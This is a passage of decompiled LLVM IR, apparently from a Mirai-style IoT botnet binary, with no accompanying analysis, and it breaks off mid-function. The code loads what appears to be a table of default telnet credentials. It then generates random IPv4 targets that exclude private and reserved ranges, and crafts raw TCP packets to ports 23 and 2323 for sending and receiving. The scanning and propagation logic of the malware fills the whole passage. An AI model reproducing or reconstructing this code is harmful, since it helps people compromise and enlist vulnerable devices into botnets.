  %v4_10628 = call i32 @add_auth_entry(i32 ptrtoint ([10 x i8]* @global_var_1b904.506 to i32), i32 ptrtoint (i32* @global_var_1b6b4.378 to i32), i32 10)
  store i32 ptrtoint (i32* @global_var_1b844.474 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b910.508 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v3_10638 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b844.474 to i32), i32 ptrtoint (i32* @global_var_1b910.508 to i32), i32 11)
  store i32 ptrtoint ([13 x i8]* @global_var_1b91c.510 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([13 x i8]* @global_var_1b92c.512 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_10648 = call i32 @add_auth_entry(i32 ptrtoint ([13 x i8]* @global_var_1b91c.510 to i32), i32 ptrtoint ([13 x i8]* @global_var_1b92c.512 to i32), i32 12)
  store i32 ptrtoint ([7 x i8]* @global_var_1b93c.514 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b944.516 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v4_10658 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1b93c.514 to i32), i32 ptrtoint (i32* @global_var_1b944.516 to i32), i32 13)
  store i32 ptrtoint ([9 x i8]* @global_var_1b94c.518 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b958.520 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v5_10668 = call i32 @add_auth_entry(i32 ptrtoint ([9 x i8]* @global_var_1b94c.518 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b958.520 to i32), i32 15)
  store i32 ptrtoint ([12 x i8]* @global_var_1b960.522 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b96c.524 to i32), i32* %r1.global-to-local, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_10678 = call i32 @add_auth_entry(i32 ptrtoint ([12 x i8]* @global_var_1b960.522 to i32), i32 ptrtoint (i32* @global_var_1b96c.524 to i32), i32 20)
  store i32 ptrtoint ([6 x i8]* @global_var_1b978.526 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b96c.524 to i32), i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  %v4_10688 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b978.526 to i32), i32 ptrtoint (i32* @global_var_1b96c.524 to i32), i32 14)
  store i32 %v4_10688, i32* %r0.global-to-local, align 4
  %v2_10690 = ptrtoint i32* %stack_var_-1866 to i32
  store i32 %v2_10690, i32* @lr, align 4
  br label %dec_label_pc_10698

dec_label_pc_10698:                               ; preds = %dec_label_pc_10dd8, %dec_label_pc_f9e0
  %stack_var_-1880.0 = phi i32 [ %v2_10690, %dec_label_pc_f9e0 ], [ %stack_var_-1880.1, %dec_label_pc_10dd8 ]
  %stack_var_-1876.0 = phi i16 [ %v5_f9d8.le, %dec_label_pc_f9e0 ], [ %stack_var_-1876.1, %dec_label_pc_10dd8 ]
  store i32 ptrtoint (i32* @global_var_2469c.163 to i32), i32* %r0.global-to-local, align 4
  %v2_1069c = load i32, i32* @global_var_2469c.163, align 4
  store i32 %v2_1069c, i32* @r4, align 4
  %v0_106a0 = load i32, i32* @fp, align 4
  %v3_106a0 = icmp uge i32 %v0_106a0, %v2_1069c
  store i1 %v3_106a0, i1* %cpsr_c.global-to-local, align 1
  %v9_106a0 = icmp eq i32 %v0_106a0, %v2_1069c
  store i1 %v9_106a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_106a0, label %dec_label_pc_10920, label %dec_label_pc_106a8

dec_label_pc_106a8:                               ; preds = %dec_label_pc_10698
  store i32 0, i32* %r3.global-to-local, align 4
  store i16 0, i16* %stack_var_-52, align 2
  %v2_106b0 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_106b0, i32* @r5, align 4
  br label %dec_label_pc_106b4

dec_label_pc_106b4:                               ; preds = %.thread39, %dec_label_pc_106a8
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-96, align 4
  %v0_106c8 = call i32 @rand_next()
  %v1_106c8 = trunc i32 %v0_106c8 to i16
  store i32 %v0_106c8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_27164.91 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_2466c.178 to i32), i32* %r2.global-to-local, align 4
  %v2_106d4 = load i32, i32* @global_var_27164.91, align 4
  store i32 %v2_106d4, i32* %r3.global-to-local, align 4
  store i16 %v1_106c8, i16* bitcast (i32* @global_var_24670.184 to i16*), align 4
  store i32 %v2_106d4, i32* @global_var_24678.527, align 4
  br label %dec_label_pc_106e0

dec_label_pc_106e0:                               ; preds = %dec_label_pc_107b4, %dec_label_pc_10710, %dec_label_pc_107e8, %dec_label_pc_107dc, %dec_label_pc_107d0, %dec_label_pc_107c4, %.thread30, %bb367, %bb366, %bb365, %bb364, %bb363, %dec_label_pc_107ac, %dec_label_pc_107a4, %bb359, %dec_label_pc_10774, %dec_label_pc_10750, %bb352, %dec_label_pc_10720, %bb351, %dec_label_pc_10708, %bb350, %bb369, %dec_label_pc_106b4
  %v0_106e0 = call i32 @rand_next()
  store i32 %v0_106e0, i32* %r0.global-to-local, align 4
  %v1_106e4 = urem i32 %v0_106e0, 256
  store i32 %v1_106e4, i32* %r1.global-to-local, align 4
  %v3_106e8 = udiv i32 %v0_106e0, 256
  store i32 %v3_106e8, i32* %r3.global-to-local, align 4
  %v3_106ec = udiv i32 %v0_106e0, 65536
  store i32 %v3_106ec, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_106f0 = icmp eq i32 %v1_106e4, 0
  store i1 %v2_106f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_106f0, label %bb350, label %bb349

bb349:                                            ; preds = %dec_label_pc_106e0
  %v3_106f4 = icmp ugt i32 %v1_106e4, 126
  store i1 %v3_106f4, i1* %cpsr_c.global-to-local, align 1
  %v8_106f4 = icmp eq i32 %v1_106e4, 127
  store i1 %v8_106f4, i1* %cpsr_z.global-to-local, align 1
  br label %bb350

bb350:                                            ; preds = %dec_label_pc_106e0, %bb349
  %v0_10704 = phi i1 [ true, %dec_label_pc_106e0 ], [ %v8_106f4, %bb349 ]
  %v1_106f8 = urem i32 %v3_106e8, 256
  store i32 %v1_106f8, i32* %ip.global-to-local, align 4
  %v1_106fc = urem i32 %v3_106ec, 256
  store i32 %v1_106fc, i32* %r2.global-to-local, align 4
  %v1_10700 = and i32 %v0_106e0, 8388608
  %v2_10700 = icmp ne i32 %v1_10700, 0
  store i1 %v2_10700, i1* %cpsr_c.global-to-local, align 1
  %v3_10700 = udiv i32 %v0_106e0, 16777216
  store i32 %v3_10700, i32* %r0.global-to-local, align 4
  br i1 %v0_10704, label %dec_label_pc_106e0, label %dec_label_pc_10708

dec_label_pc_10708:                               ; preds = %bb350
  %v2_10708 = icmp ugt i32 %v1_106e4, 2
  store i1 %v2_10708, i1* %cpsr_c.global-to-local, align 1
  %v7_10708 = icmp eq i32 %v1_106e4, 3
  store i1 %v7_10708, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10708, label %dec_label_pc_106e0, label %dec_label_pc_10710

dec_label_pc_10710:                               ; preds = %dec_label_pc_10708
  %v1_10710 = add nsw i32 %v1_106e4, -15
  store i32 %v1_10710, i32* %r3.global-to-local, align 4
  %v2_10714 = icmp ugt i32 %v1_106e4, 55
  store i1 %v2_10714, i1* %cpsr_c.global-to-local, align 1
  %v7_10714 = icmp eq i32 %v1_106e4, 56
  store i1 %v7_10714, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10714, label %dec_label_pc_106e0, label %bb351

bb351:                                            ; preds = %dec_label_pc_10710
  %v3_10718 = icmp ne i32 %v1_10710, 0
  store i1 %v3_10718, i1* %cpsr_c.global-to-local, align 1
  %v8_10718 = icmp eq i32 %v1_10710, 1
  store i1 %v8_10718, i1* %cpsr_z.global-to-local, align 1
  %v2_1071c = xor i1 %v3_10718, true
  %v3_1071c = or i1 %v8_10718, %v2_1071c
  br i1 %v3_1071c, label %dec_label_pc_106e0, label %dec_label_pc_10720

dec_label_pc_10720:                               ; preds = %bb351
  %v2_10720 = icmp ugt i32 %v1_106e4, 9
  store i1 %v2_10720, i1* %cpsr_c.global-to-local, align 1
  %v7_10720 = icmp eq i32 %v1_106e4, 10
  store i1 %v7_10720, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10720, label %dec_label_pc_106e0, label %dec_label_pc_10728

dec_label_pc_10728:                               ; preds = %dec_label_pc_10720
  %v2_10728 = icmp ugt i32 %v1_106e4, 191
  store i1 %v2_10728, i1* %cpsr_c.global-to-local, align 1
  %v7_10728 = icmp eq i32 %v1_106e4, 192
  store i1 %v7_10728, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10728, label %bb352, label %dec_label_pc_10734

bb352:                                            ; preds = %dec_label_pc_10728
  %v3_1072c = icmp ugt i32 %v1_106f8, 167
  store i1 %v3_1072c, i1* %cpsr_c.global-to-local, align 1
  %v8_1072c = icmp eq i32 %v1_106f8, 168
  store i1 %v8_1072c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1072c, label %dec_label_pc_106e0, label %dec_label_pc_10734

dec_label_pc_10734:                               ; preds = %dec_label_pc_10728, %bb352
  %v7_10734 = icmp eq i32 %v1_106e4, 172
  %.429 = zext i1 %v7_10734 to i32
  store i32 %.429, i32* %r3.global-to-local, align 4
  %v2_10740 = icmp ugt i32 %v1_106f8, 14
  store i1 %v2_10740, i1* %cpsr_c.global-to-local, align 1
  %v7_10740 = icmp eq i32 %v1_106f8, 15
  store i1 %v7_10740, i1* %cpsr_z.global-to-local, align 1
  %v2_10744 = xor i1 %v2_10740, true
  %v3_10744 = or i1 %v7_10740, %v2_10744
  br i1 %v3_10744, label %.thread8, label %bb355

.thread8:                                         ; preds = %dec_label_pc_10734
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10758

bb355:                                            ; preds = %dec_label_pc_10734
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10748 = icmp eq i1 %v7_10734, false
  store i1 %v2_10748, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10748, label %dec_label_pc_10758, label %dec_label_pc_10750

dec_label_pc_10750:                               ; preds = %bb355
  %v2_10750 = icmp ugt i32 %v1_106f8, 30
  store i1 %v2_10750, i1* %cpsr_c.global-to-local, align 1
  %v7_10750 = icmp eq i32 %v1_106f8, 31
  store i1 %v7_10750, i1* %cpsr_z.global-to-local, align 1
  %v2_10754 = xor i1 %v2_10750, true
  %v3_10754 = or i1 %v7_10750, %v2_10754
  br i1 %v3_10754, label %dec_label_pc_106e0, label %dec_label_pc_10758

dec_label_pc_10758:                               ; preds = %.thread8, %dec_label_pc_10750, %bb355
  %v7_10758 = icmp eq i32 %v1_106e4, 100
  %.430 = zext i1 %v7_10758 to i32
  store i32 %.430, i32* %r3.global-to-local, align 4
  %v2_10764 = icmp ugt i32 %v1_106f8, 62
  store i1 %v2_10764, i1* %cpsr_c.global-to-local, align 1
  %v7_10764 = icmp eq i32 %v1_106f8, 63
  store i1 %v7_10764, i1* %cpsr_z.global-to-local, align 1
  %v2_10768 = xor i1 %v2_10764, true
  %v3_10768 = or i1 %v7_10764, %v2_10768
  br i1 %v3_10768, label %.thread13, label %bb358

.thread13:                                        ; preds = %dec_label_pc_10758
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1077c

bb358:                                            ; preds = %dec_label_pc_10758
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1076c = icmp eq i1 %v7_10758, false
  store i1 %v2_1076c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1076c, label %dec_label_pc_1077c, label %dec_label_pc_10774

dec_label_pc_10774:                               ; preds = %bb358
  %v2_10774 = icmp ugt i32 %v1_106f8, 125
  store i1 %v2_10774, i1* %cpsr_c.global-to-local, align 1
  %v7_10774 = icmp eq i32 %v1_106f8, 126
  store i1 %v7_10774, i1* %cpsr_z.global-to-local, align 1
  %v2_10778 = xor i1 %v2_10774, true
  %v3_10778 = or i1 %v7_10774, %v2_10778
  br i1 %v3_10778, label %dec_label_pc_106e0, label %dec_label_pc_1077c

dec_label_pc_1077c:                               ; preds = %.thread13, %dec_label_pc_10774, %bb358
  %v2_1077c = icmp ugt i32 %v1_106e4, 168
  store i1 %v2_1077c, i1* %cpsr_c.global-to-local, align 1
  %v7_1077c = icmp eq i32 %v1_106e4, 169
  store i1 %v7_1077c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1077c, label %bb359, label %dec_label_pc_10788

bb359:                                            ; preds = %dec_label_pc_1077c
  %v3_10780 = icmp eq i32 %v1_106f8, 255
  store i1 %v3_10780, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_10780, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_10780, label %dec_label_pc_106e0, label %dec_label_pc_10788

dec_label_pc_10788:                               ; preds = %dec_label_pc_1077c, %bb359
  %v7_10788 = icmp eq i32 %v1_106e4, 198
  %.431 = zext i1 %v7_10788 to i32
  store i32 %.431, i32* %r3.global-to-local, align 4
  %v2_10794 = icmp ugt i32 %v1_106f8, 16
  store i1 %v2_10794, i1* %cpsr_c.global-to-local, align 1
  %v7_10794 = icmp eq i32 %v1_106f8, 17
  store i1 %v7_10794, i1* %cpsr_z.global-to-local, align 1
  %v2_10798 = xor i1 %v2_10794, true
  %v3_10798 = or i1 %v7_10794, %v2_10798
  br i1 %v3_10798, label %.thread19, label %bb362

.thread19:                                        ; preds = %dec_label_pc_10788
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_107ac

bb362:                                            ; preds = %dec_label_pc_10788
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1079c = icmp eq i1 %v7_10788, false
  store i1 %v2_1079c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1079c, label %dec_label_pc_107ac, label %dec_label_pc_107a4

dec_label_pc_107a4:                               ; preds = %bb362
  %v2_107a4 = icmp ugt i32 %v1_106f8, 18
  store i1 %v2_107a4, i1* %cpsr_c.global-to-local, align 1
  %v7_107a4 = icmp eq i32 %v1_106f8, 19
  store i1 %v7_107a4, i1* %cpsr_z.global-to-local, align 1
  %v2_107a8 = xor i1 %v2_107a4, true
  %v3_107a8 = or i1 %v7_107a4, %v2_107a8
  br i1 %v3_107a8, label %dec_label_pc_106e0, label %dec_label_pc_107ac

dec_label_pc_107ac:                               ; preds = %.thread19, %dec_label_pc_107a4, %bb362
  %v2_107ac = icmp ugt i32 %v1_106e4, 222
  store i1 %v2_107ac, i1* %cpsr_c.global-to-local, align 1
  %v7_107ac = icmp eq i32 %v1_106e4, 223
  store i1 %v7_107ac, i1* %cpsr_z.global-to-local, align 1
  %v2_107b0 = xor i1 %v7_107ac, true
  %v3_107b0 = and i1 %v2_107ac, %v2_107b0
  br i1 %v3_107b0, label %dec_label_pc_106e0, label %dec_label_pc_107b4

dec_label_pc_107b4:                               ; preds = %dec_label_pc_107ac
  %v1_107b4 = add nsw i32 %v1_106e4, -6
  store i32 %v1_107b4, i32* %r3.global-to-local, align 4
  %v2_107b8 = icmp ugt i32 %v1_106e4, 10
  store i1 %v2_107b8, i1* %cpsr_c.global-to-local, align 1
  %v7_107b8 = icmp eq i32 %v1_106e4, 11
  store i1 %v7_107b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107b8, label %dec_label_pc_106e0, label %bb363

bb363:                                            ; preds = %dec_label_pc_107b4
  %v3_107bc = icmp ne i32 %v1_107b4, 0
  store i1 %v3_107bc, i1* %cpsr_c.global-to-local, align 1
  %v8_107bc = icmp eq i32 %v1_107b4, 1
  store i1 %v8_107bc, i1* %cpsr_z.global-to-local, align 1
  %v2_107c0 = xor i1 %v3_107bc, true
  %v3_107c0 = or i1 %v8_107bc, %v2_107c0
  br i1 %v3_107c0, label %dec_label_pc_106e0, label %dec_label_pc_107c4

dec_label_pc_107c4:                               ; preds = %bb363
  %v2_107c4 = icmp ugt i32 %v1_106e4, 21
  store i1 %v2_107c4, i1* %cpsr_c.global-to-local, align 1
  %v7_107c4 = icmp eq i32 %v1_106e4, 22
  store i1 %v7_107c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107c4, label %dec_label_pc_106e0, label %bb364

bb364:                                            ; preds = %dec_label_pc_107c4
  %v3_107c8 = icmp ugt i32 %v1_106e4, 20
  store i1 %v3_107c8, i1* %cpsr_c.global-to-local, align 1
  %v8_107c8 = icmp eq i32 %v1_106e4, 21
  store i1 %v8_107c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_107c8, label %dec_label_pc_106e0, label %dec_label_pc_107d0

dec_label_pc_107d0:                               ; preds = %bb364
  %v2_107d0 = icmp ugt i32 %v1_106e4, 27
  store i1 %v2_107d0, i1* %cpsr_c.global-to-local, align 1
  %v7_107d0 = icmp eq i32 %v1_106e4, 28
  store i1 %v7_107d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107d0, label %dec_label_pc_106e0, label %bb365

bb365:                                            ; preds = %dec_label_pc_107d0
  %v3_107d4 = icmp ugt i32 %v1_106e4, 25
  store i1 %v3_107d4, i1* %cpsr_c.global-to-local, align 1
  %v8_107d4 = icmp eq i32 %v1_106e4, 26
  store i1 %v8_107d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_107d4, label %dec_label_pc_106e0, label %dec_label_pc_107dc

dec_label_pc_107dc:                               ; preds = %bb365
  %v2_107dc = icmp ugt i32 %v1_106e4, 29
  store i1 %v2_107dc, i1* %cpsr_c.global-to-local, align 1
  %v7_107dc = icmp eq i32 %v1_106e4, 30
  store i1 %v7_107dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107dc, label %dec_label_pc_106e0, label %bb366

bb366:                                            ; preds = %dec_label_pc_107dc
  %v3_107e0 = icmp ugt i32 %v1_106e4, 28
  store i1 %v3_107e0, i1* %cpsr_c.global-to-local, align 1
  %v8_107e0 = icmp eq i32 %v1_106e4, 29
  store i1 %v8_107e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_107e0, label %dec_label_pc_106e0, label %dec_label_pc_107e8

dec_label_pc_107e8:                               ; preds = %bb366
  %v2_107e8 = icmp ugt i32 %v1_106e4, 54
  store i1 %v2_107e8, i1* %cpsr_c.global-to-local, align 1
  %v7_107e8 = icmp eq i32 %v1_106e4, 55
  store i1 %v7_107e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107e8, label %dec_label_pc_106e0, label %bb367

bb367:                                            ; preds = %dec_label_pc_107e8
  %v3_107ec = icmp ugt i32 %v1_106e4, 32
  store i1 %v3_107ec, i1* %cpsr_c.global-to-local, align 1
  %v8_107ec = icmp eq i32 %v1_106e4, 33
  store i1 %v8_107ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_107ec, label %dec_label_pc_106e0, label %dec_label_pc_107f4

dec_label_pc_107f4:                               ; preds = %bb367
  %v2_107f4 = icmp ugt i32 %v1_106e4, 214
  store i1 %v2_107f4, i1* %cpsr_c.global-to-local, align 1
  %v7_107f4 = icmp eq i32 %v1_106e4, 215
  store i1 %v7_107f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107f4, label %.thread30, label %bb368

bb368:                                            ; preds = %dec_label_pc_107f4
  %v3_107f8 = icmp ugt i32 %v1_106e4, 213
  store i1 %v3_107f8, i1* %cpsr_c.global-to-local, align 1
  %v8_107f8 = icmp eq i32 %v1_106e4, 214
  store i1 %v8_107f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_107f8, label %bb369, label %dec_label_pc_10808

.thread30:                                        ; preds = %dec_label_pc_107f4
  br label %dec_label_pc_106e0

bb369:                                            ; preds = %bb368
  br label %dec_label_pc_106e0

dec_label_pc_10808:                               ; preds = %bb368
  %v5_10814 = call i32 @llvm.bswap.i32(i32 %v0_106e0)
  store i32 %v5_10814, i32* %r3.global-to-local, align 4
  %tmp370 = and i32 %v0_106e0, 65280
  %tmp371 = call i32 @llvm.bswap.i32(i32 %tmp370)
  %v3_1081c = udiv i32 %v5_10814, 16777216
  %tmp372 = and i32 %v0_106e0, 16711680
  %tmp373 = call i32 @llvm.bswap.i32(i32 %tmp372)
  %v4_10824 = udiv i32 %tmp371, 256
  %v4_10828 = mul nuw nsw i32 %tmp373, 256
  store i32 ptrtoint (i8** @global_var_2466c.178 to i32), i32* @r0, align 4
  %tmp374 = and i32 %v0_106e0, 65536
  %v3_10830 = icmp ne i32 %tmp374, 0
  store i1 %v3_10830, i1* %cpsr_c.global-to-local, align 1
  %v4_10830 = mul i32 %v5_10814, 16777216
  %v5_10824 = or i32 %v4_10830, %v3_1081c
  %v5_10828 = or i32 %v5_10824, %v4_10824
  %v5_10830 = or i32 %v5_10828, %v4_10828
  store i32 %v5_10830, i32* %r2.global-to-local, align 4
  store i16 0, i16* bitcast (i32* @global_var_24676.528 to i16*), align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i32 %v5_10830, i32* @global_var_2467c.529, align 4
  %v3_10840 = call i32 @checksum_generic(i32 ptrtoint (i8** @global_var_2466c.178 to i32), i32 20)
  store i32 %v3_10840, i32* %r0.global-to-local, align 4
  %v3_10844 = load i16, i16* %stack_var_-52, align 2
  %v4_10844 = sext i16 %v3_10844 to i32
  store i32 %v4_10844, i32* %r1.global-to-local, align 4
  %tmp531 = sdiv i16 %v3_10844, 10
  %v5_10854 = zext i16 %tmp531 to i32
  %v3_10858 = mul nuw nsw i32 %v5_10854, 8
  store i32 %v3_10858, i32* %r2.global-to-local, align 4
  %v2_10860 = mul nuw nsw i32 %v5_10854, 10
  store i32 %v2_10860, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_2466c.178 to i32), i32* %ip.global-to-local, align 4
  %v3_10868 = icmp uge i32 %v4_10844, %v2_10860
  store i1 %v3_10868, i1* %cpsr_c.global-to-local, align 1
  %v9_10868 = icmp eq i32 %v4_10844, %v2_10860
  store i1 %v9_10868, i1* %cpsr_z.global-to-local, align 1
  %v1_1086c = trunc i32 %v3_10840 to i16
  store i16 %v1_1086c, i16* bitcast (i32* @global_var_24676.528 to i16*), align 4
  br i1 %v9_10868, label %bb375, label %.thread37.thread

.thread37.thread:                                 ; preds = %dec_label_pc_10808
  store i32 5888, i32* %r1.global-to-local, align 4
  store i16 5888, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24680.181 to i32), i32 2) to i16*), align 2
  store i32 ptrtoint (i8** @global_var_2466c.178 to i32), i32* %r0.global-to-local, align 4
  br label %.thread39

bb375:                                            ; preds = %dec_label_pc_10808
  store i32 ptrtoint (i8** @global_var_2466c.178 to i32), i32* %r0.global-to-local, align 4
  store i32 4873, i32* %r3.global-to-local, align 4
  store i16 4873, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24680.181 to i32), i32 2) to i16*), align 2
  br label %.thread39

.thread39:                                        ; preds = %.thread37.thread, %bb375
  %v4_10890 = load i32, i32* @global_var_2467c.529, align 4
  store i32 %v4_10890, i32* @global_var_24684.531, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i16 0, i16* bitcast (i32* @global_var_24690.532 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_24680.181 to i32), i32* @r1, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v5_108b0 = call i32 @checksum_tcpudp(i32 ptrtoint (i8** @global_var_2466c.178 to i32), i32 ptrtoint (i32* @global_var_24680.181 to i32), i32 5120, i32 20)
  %v6_108b0 = trunc i32 %v5_108b0 to i16
  store i32 ptrtoint (i8** @global_var_2466c.178 to i32), i32* %r1.global-to-local, align 4
  %v2_108bc = load i32, i32* @global_var_27180.176, align 4
  store i16 %v6_108b0, i16* bitcast (i32* @global_var_24690.532 to i16*), align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v3_108e8 = load i16, i16* @global_var_24682.186, align 2
  %v4_108e8 = zext i16 %v3_108e8 to i32
  store i32 %v4_108e8, i32* @lr, align 4
  store i32 %v2_106b0, i32* %ip.global-to-local, align 4
  store i32 %v2_108bc, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v7_10904 = call i32 @__libc_sendto(i32 %v2_108bc, i32 ptrtoint (i8** @global_var_2466c.178 to i32), i32 40, i32 16384, i32 %v2_106b0, i32 16)
  store i32 %v7_10904, i32* %r0.global-to-local, align 4
  %v3_10908 = load i16, i16* %stack_var_-52, align 2
  %v4_10908 = sext i16 %v3_10908 to i32
  %v1_1090c = add nsw i32 %v4_10908, 1
  store i32 %v1_1090c, i32* %r3.global-to-local, align 4
  %v3_10910 = icmp ugt i32 %v1_1090c, 383
  store i1 %v3_10910, i1* %cpsr_c.global-to-local, align 1
  %v8_10910 = icmp eq i32 %v1_1090c, 384
  store i1 %v8_10910, i1* %cpsr_z.global-to-local, align 1
  %v5_10914 = trunc i32 %v1_1090c to i16
  store i16 %v5_10914, i16* %stack_var_-52, align 2
  %v5_10918 = icmp slt i32 %v1_1090c, 384
  br i1 %v5_10918, label %dec_label_pc_106b4, label %dec_label_pc_1091c

dec_label_pc_1091c:                               ; preds = %.thread39
  %v0_1091c = load i32, i32* @r4, align 4
  store i32 %v0_1091c, i32* @fp, align 4
  br label %dec_label_pc_10920

dec_label_pc_10920:                               ; preds = %dec_label_pc_10698, %dec_label_pc_1091c
  %v0_10920 = call i32 @__GI___errno_location()
  store i32 %v0_10920, i32* @sb, align 4
  store i32 %stack_var_-1880.0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v1_10930 = add i32 %stack_var_-1880.0, 20
  store i32 %v1_10930, i32* @r4, align 4
  %v1_10984 = add i32 %stack_var_-1880.0, 16
  %v2_10984 = inttoptr i32 %v1_10984 to i32*
  %v1_10998 = add i32 %stack_var_-1880.0, 9
  %v2_10998 = inttoptr i32 %v1_10998 to i8*
  %v4_109c4 = sext i16 %stack_var_-1876.0 to i32
  %v1_10a2c = add i32 %stack_var_-1880.0, 12
  %v2_10a2c = inttoptr i32 %v1_10a2c to i32*
  br label %dec_label_pc_10934

dec_label_pc_10934:                               ; preds = %dec_label_pc_109f4, %dec_label_pc_109ec, %dec_label_pc_109e4, %dec_label_pc_109c0, %dec_label_pc_109b0, %dec_label_pc_10994, %dec_label_pc_1097c, %dec_label_pc_109dc, %dec_label_pc_109d0, %dec_label_pc_10974, %dec_label_pc_10aac, %dec_label_pc_10920
  %v1_10938 = phi i32 [ %v0_10920, %dec_label_pc_10920 ], [ %v1_10938.pre.pre, %dec_label_pc_10aac ], [ %v0_10968, %dec_label_pc_10974 ], [ %v0_10968, %dec_label_pc_109d0 ], [ %v0_10968, %dec_label_pc_109dc ], [ %v0_10968, %dec_label_pc_1097c ], [ %v0_10968, %dec_label_pc_10994 ], [ %v0_10968, %dec_label_pc_109b0 ], [ %v0_10968, %dec_label_pc_109c0 ], [ %v0_10968, %dec_label_pc_109e4 ], [ %v0_10968, %dec_label_pc_109ec ], [ %v0_10968, %dec_label_pc_109f4 ]
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_10938 = inttoptr i32 %v1_10938 to i32*
  store i32 0, i32* %v2_10938, align 4
  %v2_10944 = load i32, i32* @global_var_27180.176, align 4
  store i32 %v2_10944, i32* %r0.global-to-local, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-1880.0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10954 = load i32, i32* %ip.global-to-local, align 4
  %v6_1095c = call i32 @__libc_recvfrom(i32 %v2_10944, i32 %stack_var_-1880.0, i32 1514, i32 16384, i32 %v0_10954, i32 %v0_10954)
  store i32 %v6_1095c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10960 = icmp eq i32 %v6_1095c, 0
  store i1 %v2_10960, i1* %cpsr_z.global-to-local, align 1
  %tmp376 = icmp slt i32 %v6_1095c, 1
  br i1 %tmp376, label %dec_label_pc_10ad0, label %dec_label_pc_10968

dec_label_pc_10968:                               ; preds = %dec_label_pc_10934
  %v0_10968 = load i32, i32* @sb, align 4
  %v1_10968 = inttoptr i32 %v0_10968 to i32*
  %v2_10968 = load i32, i32* %v1_10968, align 4
  store i32 %v2_10968, i32* %r3.global-to-local, align 4
  %v2_1096c = icmp ugt i32 %v2_10968, 10
  store i1 %v2_1096c, i1* %cpsr_c.global-to-local, align 1
  %v7_1096c = icmp eq i32 %v2_10968, 11
  store i1 %v7_1096c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1096c, label %dec_label_pc_10ad0, label %dec_label_pc_10974

dec_label_pc_10974:                               ; preds = %dec_label_pc_10968
  %v2_10974 = icmp ugt i32 %v6_1095c, 38
